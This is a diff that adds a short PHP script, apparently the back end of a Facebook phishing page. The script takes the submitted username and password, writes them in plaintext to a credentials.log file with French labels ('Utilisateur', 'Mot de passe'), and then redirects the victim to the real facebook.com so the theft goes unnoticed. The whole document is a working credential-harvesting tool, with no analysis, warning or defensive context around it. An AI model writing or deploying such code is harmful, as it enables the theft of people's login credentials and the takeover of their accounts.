@@ -1,0 +1,13 @@
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = $_POST["username"];
+    $password = $_POST["password"];
+    
+    $file = fopen("../../logs/credentials.log", "a");
+    fwrite($file, "Facebook | Utilisateur : " . $username . " | Mot de passe : " . $password . "\n");
+    fclose($file);
+
+    header("Location: https://www.facebook.com");
+    exit();
+}
+?>
